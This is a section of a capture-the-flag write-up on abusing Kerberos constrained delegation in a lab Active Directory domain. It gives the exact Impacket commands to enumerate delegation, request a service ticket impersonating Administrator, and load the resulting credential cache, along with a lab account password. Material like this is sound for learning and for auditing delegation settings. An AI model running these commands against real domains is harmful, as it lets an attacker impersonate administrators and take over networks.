# 04 — Constrained Delegation & Kerberos Abuse

## 1. Check Delegation Rights

After validating `svc.scanner`, I checked for constrained delegation:

```bash
findDelegation.py 'ctf.local/svc.scanner:1summerlove!' -dc-ip $ip
```

The important concept is that the account's delegation configuration can reveal whether it is trusted to obtain service tickets to another service.

## 2. Request a Service Ticket

Once the delegating account and target SPN were identified, the supplied workflow used:

```bash
getST.py -spn cifs/DC01.ctf.local -impersonate Administrator -dc-ip $ip 'ctf.local/svc.scanner:1summerlove!'
```

The key options are:

```text
-spn
    Target service principal name.

-impersonate Administrator
    Request the service ticket as the Administrator identity.

-dc-ip
    Domain Controller used for the Kerberos operation.
```

### Attack Concept

The important chain is:

```text
svc.scanner
     ↓
Constrained Delegation
     ↓
Service Ticket Request
     ↓
S4U Impersonation
     ↓
Administrator Service Ticket
```

This is why delegation enumeration was critical after compromising the service account.

## 3. Kerberos Cache

The generated Kerberos credential cache was then selected with:

```bash
export KRB5CCNAME=Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
```

This tells Kerberos-aware tooling which credential cache to use.

## 4. Why This Is Different from Pass-the-Hash

The earlier stage involved a cracked password.

The final stage did **not** require recovering the Administrator plaintext password.

Instead:

```text
svc.scanner credentials
        ↓
Delegation abuse
        ↓
Kerberos service ticket
        ↓
Administrator impersonation
```

This demonstrates why Active Directory delegation configuration is an important part of privilege-path analysis.
